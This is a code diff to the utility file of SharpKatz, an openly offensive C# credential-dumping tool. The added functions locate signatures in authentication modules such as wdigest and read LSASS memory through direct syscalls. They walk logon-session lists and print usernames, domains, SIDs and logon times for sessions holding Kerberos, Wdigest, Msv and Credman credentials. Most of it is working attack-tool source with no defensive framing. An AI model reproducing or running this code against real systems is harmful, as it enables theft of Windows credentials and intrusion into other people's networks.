@@ -6,7 +6,10 @@ using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
+using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;
+
 using static SharpKatz.Natives;
+using System.Globalization;
 
 namespace SharpKatz
 {
@@ -40,23 +43,95 @@ namespace SharpKatz
             return offset;
         }
 
+        public static ulong OffsetFromSign(string modulename, byte[] sign, long max_search_size)
+        {
+            IntPtr moduleLocal;
+            // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
+            moduleLocal = Natives.LoadLibrary(modulename);
+            if (moduleLocal == IntPtr.Zero)
+            {
+                Console.WriteLine("[x] Error: Could not load {0} into local process", modulename);
+                return 0;
+            }
+
+            byte[] tmpbytes = new byte[max_search_size];
+            Marshal.Copy(moduleLocal, tmpbytes, 0, (int)max_search_size);
+
+            return SearchPattern(tmpbytes, sign);
+        }
+
+        public static IntPtr GetIntPtr(IntPtr hLsass, IntPtr msvMem, long signOffset, int targetoffset)
+        {
+            long listMemOffset;
+            IntPtr tmp_p = IntPtr.Add(msvMem, (int)signOffset + targetoffset);
+            byte[] listMemOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
+            listMemOffset = BitConverter.ToInt32(listMemOffsetBytes, 0);
+
+            int tmp_offset = 0;
+            if (targetoffset > 0)
+            {
+                tmp_offset = (int)signOffset + targetoffset + sizeof(int) + (int)listMemOffset;
+            }
+            else
+            {
+                tmp_offset = (int)signOffset + (int)listMemOffset;
+            }
+
+            tmp_p = IntPtr.Add(msvMem, tmp_offset);
+            byte[] listAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
+            IntPtr listAddr = new IntPtr(BitConverter.ToInt64(listAddrBytes, 0));
+
+            //Console.WriteLine("[*] Kerberos UnloadLogonSessionTable found at address {0:X}", kerbUnloadLogonSessionTableAddr.ToInt64());
+            return listAddr;
+        }
+
+        public static int GetInt(IntPtr hLsass, IntPtr msvMem, long signOffset, int targetoffset)
+        {
+            long listMemOffset;
+            IntPtr tmp_p = IntPtr.Add(msvMem, (int)signOffset + targetoffset);
+            byte[] listMemOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
+            listMemOffset = BitConverter.ToInt32(listMemOffsetBytes, 0);
+
+            int tmp_offset = 0;
+            if (targetoffset > 0)
+            {
+                tmp_offset = (int)signOffset + targetoffset + sizeof(int) + (int)listMemOffset;
+            }
+            else
+            {
+                tmp_offset = (int)signOffset + (int)listMemOffset;
+            }
+
+            tmp_p = IntPtr.Add(msvMem, tmp_offset);
+            byte[] intAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
+            int intval = BitConverter.ToInt32(intAddrBytes, 0);
+
+            //Console.WriteLine("[*] Kerberos UnloadLogonSessionTable found at address {0:X}", kerbUnloadLogonSessionTableAddr.ToInt64());
+            return intval;
+        }
+
+        public static IntPtr GetListAdress(IntPtr hLsass, IntPtr msvMem, string modulename, long max_search_size, int listOffset, byte[] sign)
+        {
+            long listSignOffset, listMemOffset;
+            IntPtr listAddr;
+
+            listSignOffset = (long)OffsetFromSign(modulename, sign, max_search_size);
+            if (listSignOffset == 0)
+            {
+                Console.WriteLine("[x] Error: Could not find signature into {0}", modulename);
+                return IntPtr.Zero;
+            }
+            
+            return GetIntPtr( hLsass,  msvMem, listSignOffset, listOffset);
+        }
+
         // Read memory from LSASS process
         public static byte[] ReadFromLsass(ref IntPtr hLsass, IntPtr addr, ulong bytesToRead)
         {
-            //IntPtr bytesRead = IntPtr.Zero;
             int bytesRead = 0;
             byte[] bytev = new byte[Convert.ToInt32(bytesToRead)];
 
-            //IntPtr unmanagedPointer = Marshal.AllocHGlobal(Convert.ToInt32(bytesToRead));
-
             NTSTATUS status = SysCall.NtReadVirtualMemory10(hLsass, addr, bytev, Convert.ToInt32(bytesToRead), bytesRead);
-            //Console.WriteLine("Status : " + status);
-            //Console.WriteLine("bytesToRead : " + bytesToRead);
-            //Console.WriteLine("bytesRead : " + bytesRead);
-            //Natives.ReadProcessMemory(hLsass, addr, unmanagedPointer, Convert.ToInt32(bytesToRead), out bytesRead);
-            //Marshal.Copy(unmanagedPointer, bytev, 0, Convert.ToInt32(bytesToRead));
-
-            //Marshal.FreeHGlobal(unmanagedPointer);
 
             return bytev;
         }
@@ -74,7 +149,6 @@ namespace SharpKatz
 
         public unsafe static int FieldOffset<T>(string fieldName)
         {
-            //Console.WriteLine("[*] Feeld {0} offset {1}", fieldName, Marshal.OffsetOf(typeof(T), fieldName).ToInt32());
             return Marshal.OffsetOf(typeof(T), fieldName).ToInt32();
         }
 
@@ -91,7 +165,6 @@ namespace SharpKatz
             sizeSid = 4 * nbAuth + 6 + 1 + 1;
 
             byte[] sid_b = Utility.ReadFromLsass(ref hLsass, new IntPtr(pSidInt), (ulong)sizeSid);
-            //ReadFromLsass(hLsass, (char*)*pSid, pSidDest, sizeSid);
 
             return sid_b;
         }
@@ -107,8 +180,7 @@ namespace SharpKatz
         public static unsafe Natives.UNICODE_STRING ExtractUnicodeString(IntPtr hLsass, IntPtr addr)
         {
             Natives.UNICODE_STRING str;
-
-            // Read LSA_UNICODE_STRING from lsass memory
+            
             byte[] strBytes = Utility.ReadFromLsass(ref hLsass, addr, Convert.ToUInt64(sizeof(Natives.UNICODE_STRING)));
             str = ReadStruct<Natives.UNICODE_STRING>(strBytes);
 
@@ -129,7 +201,7 @@ namespace SharpKatz
             {
                 return encoder.GetString(resultBytes);
             }
-            catch(Exception e)
+            catch(Exception)
             {
                 return PrintHexBytes(resultBytes);
             }
@@ -185,6 +257,20 @@ namespace SharpKatz
             return resBytes;
         }
 
+        private static DateTime ToDateTime(FILETIME time)
+        {
+            long fileTime = (((long)time.dwHighDateTime) << 32) | ((uint)time.dwLowDateTime);
+
+            try
+            {
+                return DateTime.FromFileTime(fileTime);
+            }
+            catch
+            {
+                return DateTime.FromFileTime(0xFFFFFFFF);
+            }
+        }
+
         public static void PrintLogonList(List<Logon> logonlist)
         {
             if (logonlist == null || logonlist.Count == 0)
@@ -194,12 +280,13 @@ namespace SharpKatz
             {
                 if (logon.Msv != null || logon.Ssp != null || logon.Wdigest != null || logon.Kerberos != null || logon.Tspkg != null || logon.Credman != null || logon.KerberosKeys != null)
                 {
-                    Console.WriteLine("[*] Authentication Id : {0};{1} ({2:X}:{3:X})", logon.LogonId.HighPart, logon.LogonId.LowPart, logon.LogonId.HighPart, logon.LogonId.LowPart);
-                    Console.WriteLine("[*] Session {0} from {1}", logon.LogonType, logon.Session);
-                    Console.WriteLine("[*] UserName {0}", logon.UserName);
-                    Console.WriteLine("[*] LogonDomain {0}", logon.LogonDomain);
-                    Console.WriteLine("[*] LogonServer {0}", logon.LogonServer);
-                    Console.WriteLine("[*] SID {0}", logon.SID);
+                    Console.WriteLine("[*] Authentication Id\t: {0};{1} ({2:X}:{3:X})", logon.LogonId.HighPart, logon.LogonId.LowPart, logon.LogonId.HighPart.ToString().PadLeft(8, '0'), logon.LogonId.LowPart.ToString().PadLeft(8, '0'));
+                    Console.WriteLine("[*] Session\t\t: {0} from {1}", logon.LogonType, logon.Session);
+                    Console.WriteLine("[*] UserName\t\t: {0}", logon.UserName);
+                    Console.WriteLine("[*] LogonDomain\t\t: {0}", logon.LogonDomain);
+                    Console.WriteLine("[*] LogonServer\t\t: {0}", logon.LogonServer);
+                    Console.WriteLine("[*] LogonTime\t\t: {0:yyyy/MM/dd HH:mm:ss}", ToDateTime(logon.LogonTime));
+                    Console.WriteLine("[*] SID\t\t\t: {0}", logon.SID);
                     Console.WriteLine("[*]");
 
                     
@@ -383,19 +470,5 @@ namespace SharpKatz
             return hex.ToString();
         }
 
-        public static Keys.KIWI_BCRYPT_HANDLE_KEY FromArray(byte[] bytes)
-        {
-            var reader = new BinaryReader(new MemoryStream(bytes));
-
-            var s = default(Keys.KIWI_BCRYPT_HANDLE_KEY);
-
-            s.size = reader.ReadInt32();
-            s.tag = reader.ReadInt32();
-            s.hAlgorithm = new IntPtr(reader.ReadInt64());
-            s.key = new IntPtr(reader.ReadInt64());
-            s.unk0 = new IntPtr(reader.ReadInt64());
-
-            return s;
-        }
     }
 }
